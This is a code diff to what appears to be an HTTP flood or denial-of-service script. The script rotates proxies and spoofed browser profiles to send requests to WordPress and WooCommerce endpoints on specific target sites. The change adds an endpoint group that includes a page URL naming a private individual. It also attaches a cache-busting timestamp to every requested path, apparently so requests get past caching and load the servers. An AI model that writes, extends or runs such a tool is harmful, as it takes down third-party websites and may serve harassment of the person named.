@@ -49,6 +49,9 @@ ENDPOINT_SETS = {
                 "/?wc-ajax=checkout",
                 "/?wc-ajax=get_cart_contents",
                 "/?wc-ajax=update_order_review"],
+    "shatkin_open": ["/feed/", "/comments/feed/", "/sitemap_index.xml",
+                     "/page-sitemap.xml", "/category-sitemap.xml",
+                     "/dentist-todd-shatkins-history-of-stalking/"],
     "buffalo": ["/", "/feed/", "/comments/feed/", "/sitemap_index.xml", "/sitemap.xml",
                 "/page-sitemap.xml", "/category-sitemap.xml", "/post-sitemap.xml",
                 "/wp-sitemap.xml", "/author/admin/", "/author/admin/feed/",
@@ -103,9 +106,8 @@ def next_proxy(single_proxy):
 def send_one(target, single_proxy, req_num):
     imp, ua = random.choice(PROFILES)
     path = random.choice(_endpoints)
-    if "wc-ajax=" in path:
-        sep = "&" if "?" in path else "?"
-        path = f"{path}{sep}_={int(time.time() * 1000) + random.randint(0, 999)}"
+    sep = "&" if "?" in path else "?"
+    path = f"{path}{sep}_={int(time.time() * 1000) + random.randint(0, 999)}"
     url  = f"https://{target}{path}"
     p    = next_proxy(single_proxy)
     px   = {"http": p, "https": p} if p else None
@@ -169,7 +171,7 @@ def main():
     ap.add_argument("--endpoints",   nargs="+",
                     choices=list(ENDPOINT_SETS.keys()) + ["all"],
                     default=["all"],
-                    help="endpoint groups: feed sitemap home shatkin buffalo woo all")
+                    help="endpoint groups: feed sitemap home shatkin shatkin_open buffalo woo all")
     args = ap.parse_args()
 
     global _endpoints
